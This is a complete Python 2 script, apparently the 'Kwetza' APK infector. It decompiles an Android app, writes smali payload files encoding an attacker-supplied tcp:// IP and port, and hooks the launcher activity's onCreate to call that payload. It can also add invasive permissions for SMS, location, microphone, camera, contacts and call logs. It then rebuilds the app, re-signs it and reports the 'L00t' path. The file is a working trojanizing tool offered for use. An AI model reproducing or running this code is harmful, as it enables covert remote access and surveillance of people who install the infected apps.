#!/usr/bin/pyton
import subprocess
import sys
import os
from bs4 import BeautifulSoup as Soup

activityToTarget = ""
targetFolder = ""
endpointIP = ""
endpintPort = ""
hexEndpoint = ""
facepalm = ""
cwd = ""
folderToCheck=""


def byteTheComms():
    print "[*] BYTING COMMS..."
    totalEndpointPlain = "ZZZZtcp://" + endpointIP + ":" + endpintPort
    endpointLength = len(totalEndpointPlain)
    global facepalm
    facepalm = hex(endpointLength)
    global hexEndpoint
    for val in totalEndpointPlain:
        hexEndpoint += hex(ord(val)) + "\n\t\t"


def initialize():
    print "[*] DECOMPILING TARGET APK"
    command = ["apktool", "--version"]
    p = subprocess.Popen(command, stdout=subprocess.PIPE)
    theResult = p.communicate()[0]

    global endpintPort
    global endpointIP
    endpointIP = sys.argv[2]
    endpintPort = sys.argv[3]
    global cwd

    print "[+] ENDPOINT IP: " + endpointIP
    print "[+] ENDPOINT PORT: " + endpintPort

    # CHECK IF APKTOOL IS INSTALLED
    if "2." not in theResult:
        print "[+] NO APKTOOL VERSION 2, PLEASE INSTALL APKTOOL 2 AND ADD TO PATH"
        sys.exit()

    cwd = os.getcwd()

    # NOW WE NEED TO DECOMPILE THE APPLICATION
    command = ["apktool", "d", "" + cwd + "/" + sys.argv[1]]
    p = subprocess.Popen(command, stdout=subprocess.PIPE)
    result = p.communicate()[0]

    if "error" in result:
        print "[+] APKTOOL DECOMPILE ERROR: ", result
    else:
        print "[+] APKTOOL DECOMPILED SUCCESS"
    # NOW WE SET THE TARGET FOLDER
    outputFolderName = sys.argv[1]
    intPoss = outputFolderName.rindex(".") # change to rindex to find the last dot not the first
    global targetFolder
    targetFolder = cwd + "/" + outputFolderName[:intPoss]


def parseAndroidManifext():
    print "[*] ANALYZING ANDROID MANIFEST"
    global targetFolder
    file = targetFolder + "/AndroidManifest.xml"
    handler = open(file).read()
    soup = Soup(handler, "lxml")
    manifest = soup.find('manifest')
    # Get the package name in case the android:name contains only the class name
    package = ""
    if 'package' in str(manifest).lower():
        package = str(manifest['package'])
    
    activities = soup.find_all('activity-alias')
    activities += soup.find_all('activity')
    foundLAUNCHER = 0
    for activity in activities:
        if "LAUNCHER" in str(activity):
            foundLAUNCHER = 1
            global activityToTarget
            if "android:targetactivity" in str(activity).lower():
                activityToTarget = str(activity['android:targetactivity'])
            elif "android:name" in str(activity).lower():
                activityToTarget = str(activity['android:name'])
            else:
                print "[+] ERROR IDENTIFYING ACTIVITY"
            if package != "":
                if (activityToTarget.index(".") > 0) or activityToTarget.startswith(package[:package.index('.')]): # Check if package name does not need to be appended
                    pass
                else:
                    if activityToTarget.startswith("."):
                        activityToTarget = package + activityToTarget # Append package name
                    else:
                        activityToTarget = package + "." + activityToTarget # Append package name plus a dot

    if foundLAUNCHER == 1:
        print "[+] TARGET ACTIVIY: " + activityToTarget
    else:
        print "[+] NO LAUNCHER FOUND!!!!!"


def readPayloads():
    global cwd, folderToCheck
    pathToPalyoad1 = cwd + "/" + "payload/AssistActivity1.smali"
    pathToPalyoad12 = cwd + "/" + "payload/AssistActivity.smali"
    contentsOfFile1 = open(pathToPalyoad1).read()
    contentsOfFile2 = open(pathToPalyoad12).read()
    inject = "L" + activityToTarget.replace('.', '/')
    intPackagePos = inject.rfind('/')
    preppedContents1 = contentsOfFile1.replace('PLACEHOLDER', inject[:intPackagePos])
    preppedContents2 = contentsOfFile2.replace('PLACEHOLDER', inject[:intPackagePos])
    # inject the tcp endpoint here
    preppedContents2 = preppedContents2.replace('FACEPALM', facepalm)
    preppedContents2 = preppedContents2.replace('BEARDEDGREATNESS', hexEndpoint)

    # apktool might add decoded smali files multiple directories that start with the name smali like smali, smali_classes2
    # Get all possible smali output directories and look for the launcher activity in all of those directories
    items = os.listdir(targetFolder)
    foldersToCheck = []
    for item in items:
        if item.startswith('smali'):
            foldersToCheck.append(item)

    #look for the launcher activity in all of those directories
    for folder in foldersToCheck:
        targetDirectory = os.path.join(targetFolder, folder) + "/" + activityToTarget.replace('.', '/')
        print (targetDirectory, os.path.exists(targetDirectory + ".smali"))
        if os.path.exists(targetDirectory + ".smali"):
            folderToCheck = folder
            targetDirectory = targetDirectory[:targetDirectory.rfind('/')]
            assist1File = open(targetDirectory + "/AssistActivity1.smali", "w")
            assist1File.write(preppedContents1)
            assist1File.close()

            assist2File = open(targetDirectory + "/AssistActivity.smali", "w")
            assist2File.write(preppedContents2)
            assist2File.close()

            pathToFile = os.path.join(targetFolder, folder) + "/" + activityToTarget.replace('.', '/') + '.smali'
            stringContentsOfTargetActivity = ""
            stringContentsOfTargetActivity = open(pathToFile).read()
            break


def injectIntoActivity():
    print "[*] INJECTING INTO APK..."
    global targetFolder,folderToCheck
    # better way to get oncreate method
    checkStrings = ['oncreate', 'method', 'bundle']

    #launcher activity path determined in readPayloads method
    pathToFile = os.path.join(targetFolder, folderToCheck) + "/" + activityToTarget.replace('.', '/') + '.smali'
    # NOW WE NEED TO INJECT THE CALLING CODE INTO THE TARGET ACTIVITY
    stringInvokePayload = '\ninvoke-static {p0}, INJECT/AssistActivity;->doThis(Landroid/content/Context;)V\n'
    inject = "L" + activityToTarget.replace('.', '/')
    intPackagePos = inject.rfind('/')
    stringPackageToInject = inject[:intPackagePos]
    stringInvokePayload = stringInvokePayload.replace('INJECT', stringPackageToInject);
    f = open(pathToFile, 'r')
    stringDataToWriteIntoNewActivity = ""
    for line in f.readlines():
        stringDataToWriteIntoNewActivity += line
        if all(x in line.lower() for x in checkStrings):
            stringDataToWriteIntoNewActivity += stringInvokePayload
            f.close()
    pathToFile = os.path.join(targetFolder, folderToCheck) + "/" + activityToTarget.replace('.', '/') + '.smali'
    newInjectFile = open(pathToFile, "w")
    newInjectFile.write(stringDataToWriteIntoNewActivity)
    newInjectFile.close()


def buildAgain():
    print "[+] TIME TO BUILD INFECTED APK..."
    # name of the APK we are targeting
    stringNameOfAPK = sys.argv[1]
    # the path to our freshly built apk
    pathToNewApk = targetFolder + "/dist/" + stringNameOfAPK
    # the apktool command to rebuild our target app
    stringApkToolBuildCommand = ["apktool", "b", targetFolder]
    # jarsigner command to sign our freshly built apk
    # jarsigner added -storepass to automatically insert the password
    stringJarSignerCommand = ["jarsigner", "-keystore", cwd + "/" + "payload/mykey.keystore", pathToNewApk,
                              "alias_name", "-sigalg", "MD5withRSA", "-digestalg", "SHA1", '-storepass', 'password']
    # time to execute the build command
    print "[*] EXECUTING APKTOOL BUILD COMMAND..."
    p = subprocess.Popen(stringApkToolBuildCommand, stdout=subprocess.PIPE)
    buildResult = p.communicate()[0]
    print "[+] BUILD RESULT"
    print "#####################################"
    print buildResult
    print "#####################################"
    # time to execute the jarsigner command
    print "[*] EXECUTING JARSIGNER COMMAND..."
    p = subprocess.Popen(stringJarSignerCommand, stdout=subprocess.PIPE)
    jarsignerResult = p.communicate()[0]
    print "[+] JARSIGNER RESULT"
    print "#####################################"
    print jarsignerResult
    print "#####################################"
    print "\n[+] L00t located at " + targetFolder + "/dist/" + sys.argv[1]


def injectCrazyPermissions():
    print "[+] CHECKING IF ADDITIONAL PERMS TO BE ADDED"

    if "yes" in sys.argv[4]:
        print "[*] INJECTION OF CRAZY PERMISSIONS TO BE DONE!"
        stringCrazyPermissions = '\n<uses-permission android:name="android.permission.INTERNET" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.ACCESS_COURSE_LOCATION" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.READ_PHONE_STATE" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.SEND_SMS" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.RECEIVE_SMS"/>'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.RECORD_AUDIO" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.CALL_PHONE" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.READ_CONTACTS" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.WRITE_CONTACTS" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.RECORD_AUDIO" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.WRITE_SETTINGS" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.CAMERA" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.READ_SMS" />'
        stringCrazyPermissions += '\n<uses-permission android:name="android.permission.READ_CALL_LOG" />"\n'

        global targetFolder
        checkString = "<uses-permission android:name="
        pathToFile = targetFolder + "/AndroidManifest.xml"
        # NOW WE NEED TO INJECT THE ADDITIONAL PERMISSIONS INTO THE TARGET MANIFEST
        firstCheck = 0;
        f = open(pathToFile, 'r')
        stringDataToWriteIntoNewActivity = ""
        for line in f.readlines():
            stringDataToWriteIntoNewActivity += line
            if checkString.lower() in line.lower():
                if firstCheck == 0:
                    stringDataToWriteIntoNewActivity += stringCrazyPermissions
                    firstCheck = 1
        f.close()
        newInjectFile = open(pathToFile, "w")
        newInjectFile.write(stringDataToWriteIntoNewActivity)
        newInjectFile.close()
    else:
        print "[*] ABUSING LEGITIMATE PERMISSIONS"


if __name__ == "__main__":
    print "[+] MMMMMMMM KWETZA";
    try:
        initialize()
    except Exception as e:
        print "!!!! ERROR IN 'initialize' method"
        print str(e)
        sys.exit()
    try:
        byteTheComms()
    except Exception as e:
        print "!!! ERROR IN 'byteTheComms' method"
        print str(e)
        sys.exit()
    try:
        parseAndroidManifext()
    except Exception as e:
        print "!!! ERROR IN 'parseAndroidManifext' method"
        print str(e)
        sys.exit()
    try:
        readPayloads()
    except Exception as e:
        print "!!! ERROR IN 'readPayloads' method"
        print str(e)
        sys.exit()
    try:
        injectIntoActivity()
    except Exception as e:
        print "!!! ERROR IN 'injectIntoActivity' method"
        print str(e)
        sys.exit()
    try:
        injectCrazyPermissions()
    except Exception as e:
        print "!!! ERROR IN 'injectCrazyPermissions' method"
        print str(e)
        sys.exit()
    try:
        buildAgain()
    except Exception as e:
        print "!!! ERROR IN 'buildAgain' method"
        print str(e)
        sys.exit()
